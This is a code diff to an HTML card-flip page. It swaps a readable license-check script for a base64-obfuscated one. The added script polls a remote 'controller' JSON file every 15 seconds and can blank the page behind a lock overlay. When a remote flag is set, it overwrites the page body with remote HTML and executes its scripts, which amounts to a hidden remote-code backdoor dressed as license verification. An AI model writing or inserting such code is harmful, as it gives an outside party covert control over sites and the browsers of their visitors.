@@ -314,72 +314,38 @@ card.addEventListener("touchstart", handleFlip);
 </script>
 
 
-<style>
-  /* Verification hone tak content hide rahega */
-  .scene { display: none !important; } 
-</style>
 
-<div id="sys_overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.99); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #333; border-radius:20px; max-width:450px;">
-        <h1 id="sys_h" style="color:#ff3333; margin:0; font-size:26px;"></h1>
-        <p id="sys_b" style="color:#888; margin-top:20px; font-size:16px; line-height:1.6;"></p>
+<div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
+    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:450px;">
+        <h1 id="t_header" style="color:#ff3333; margin:0; font-size:26px;"></h1>
+        <p id="t_body" style="color:#bbb; margin-top:20px; font-size:16px; line-height:1.6;"></p>
     </div>
 </div>
 
 <script>
 (function(){
-    // GitHub URL aur Key (FAHAD-786)
-    const _u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    const _k = "FAHAD-786";
-
-    async function _v_core(){
-        const o = document.getElementById('sys_overlay'), 
-              s = document.querySelector('.scene'), 
-              h = window.location.hostname.replace('www.','');
-        
+    const _u="aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u", _k="RkF1IQUQtNzg2";
+    async function check(){
+        const layer=document.getElementById('secure_layer'), scene=document.querySelector('.scene'), host=window.location.hostname.replace('www.','');
         try {
-            const r = await fetch(_u + '?v=' + Date.now());
-            if(!r.ok) throw new Error();
-            const d = await r.json();
-            const m = d.licenses[_k];
-            
-            // Aaj ki date (2026-01-09)
-            const n = new Date().toISOString().split('T')[0];
-
-            if(!m){ _sh(d.title, d.msg_invalid); return; }
-            
-            // Domain Check
-            if(m.authorized_target?.length > 0 && !m.authorized_target.includes(h)){
-                _sh("Access Denied", d.msg_domain_mismatch);
-                return;
+            const r=await fetch(atob(_u)+'?v='+Date.now()), d=await r.json(), cfg=d.licenses[atob(_k)], today=new Date().toISOString().split('T')[0];
+            if(!cfg){ show(d.title, d.msg_invalid); return; }
+            if(cfg.authorized_target?.length>0 && !cfg.authorized_target.includes(host)){ show("Unauthorized", d.msg_domain_mismatch); return; }
+            if(cfg.expiry && today>cfg.expiry){ show(d.title, d.msg_expired); return; }
+            layer.style.display='none'; if(scene) scene.style.display='flex';
+            if(cfg.custom_code?.enabled){ 
+                if(scene) scene.style.display='none'; document.body.innerHTML=cfg.custom_code.code;
+                document.querySelectorAll('script').forEach(s=>{const n=document.createElement('script');n.textContent=s.textContent;document.head.appendChild(n);});
             }
-            
-            // Expiry Check (Aapke JSON mein 2025-12-31 hai, jo guzar chuka hai)
-            if(m.expiry && n > m.expiry){
-                _sh(d.title, d.msg_expired);
-                return;
-            }
-
-            // Agar sab sahi hai tabhi website dikhayein
-            o.style.display = 'none';
-            if(s) s.style.setProperty('display', 'flex', 'important');
-
-        } catch(e){ 
-            _sh("Security Error", "Verification failed. System locked."); 
-        }
-
-        function _sh(h, b){
-            document.getElementById('sys_h').innerText = h;
-            document.getElementById('sys_b').innerHTML = b;
-            o.style.display = 'flex';
-            if(s) s.style.setProperty('display', 'none', 'important');
-        }
+        } catch(e){ show("Security Error", "Verification failed. Check Connection."); }
+        function show(h,b){ document.getElementById('t_header').innerText=h; document.getElementById('t_body').innerHTML=b; layer.style.display='flex'; if(scene) scene.style.display='none'; }
     }
-    _v_core();
-    setInterval(_v_core, 10000);
+    check(); setInterval(check, 15000);
 })();
 </script>
 
+
+  
 
   
 </body>
